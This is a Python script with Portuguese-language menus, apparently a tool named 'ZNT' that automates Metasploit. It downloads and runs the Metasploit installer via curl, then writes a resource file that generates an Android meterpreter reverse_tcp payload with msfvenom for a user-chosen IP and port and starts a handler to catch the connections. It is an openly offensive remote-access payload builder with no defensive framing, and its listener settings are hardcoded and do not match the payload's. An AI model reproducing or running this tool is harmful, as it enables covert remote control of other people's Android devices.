import os
import sys

print("\n")
print("\033[1;32m ::::::::::        ::::    :::   ::::::::::::::\033[0;0m")
print("\033[1;32m       :+:        :+:+:   :+:        :+:  	 	\033[0;0m")
print("\033[1;32m      +:+        :+:+:+  +:+        +:+   	  	\033[0;0m")
print("\033[1;32m     +#+        +#+ +:+ +#+        +#+    	   	\033[0;0m")
print("\033[1;32m    +#+        +#+  +#+#+#        +#+     	 	\033[0;0m")
print("\033[1;32m   #+#        #+#   #+#+#        #+#     		\033[0;0m")
print("\033[1;32m  #########  ###    ####        ###       		\033[0;0m")
print("\n")


print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
print("\033[1;32m║ [1]baixar dependecia ? : 	  \033[0;0m")
print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
print("\033[1;32m║ [2]criar payload  ? : \033[0;0m")
print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
print("\033[1;32m║ [3]exploitados ? : 	\033[0;0m")
print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
print("\033[1;32m║ [4]Sair ? : 		\033[0;0m")
print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

#variaveis

baixar = "1"
criar = "2"
entrar = "3"
sair = "4"

print("\n")

x = input("\033[1;32m Exemplo Opção [1] : \033[0;0m")

if x == '1':

	os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \ ")
	os.system("  chmod 755 msfinstall && \ ")
	os.system("  ./msfinstall")

elif x == '2':

	# ZNT e uma ferramenta criada para automatizar o processo der criar payload


	print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
	nome = input("\033[1;32m║ Digite nome do app : \033[0;0m")
	print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

	print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
	ip = input("\033[1;32m║ Digite ip : \033[0;0m")
	print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

	print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
	porta = input("\033[1;32m║ Digite porta : \033[0;0m")
	print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

	fp = open("msf.rc", "w")
	fp.write(f"""
	msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} R > {nome}
	use multi/handler
	set payload android/meterpreter/reverse_tcp
	set lhost 127.0.0.1
	set lport 8888
	clear
	exploit
	""")

	fp.close()

	os.system("msfconsole -r msf.rc")

elif x == '3':

	fp = open("msf.rc", "w")
	fp.write(f"""
	use multi/handler
	set payload android/meterpreter/reverse_tcp
	set lhost 127.0.0.1
	set lport 8888
	clear
	exploit
	""")
	fp.close()

	os.system("msfconsole -r msf.rc")

elif x == '4':
	pass
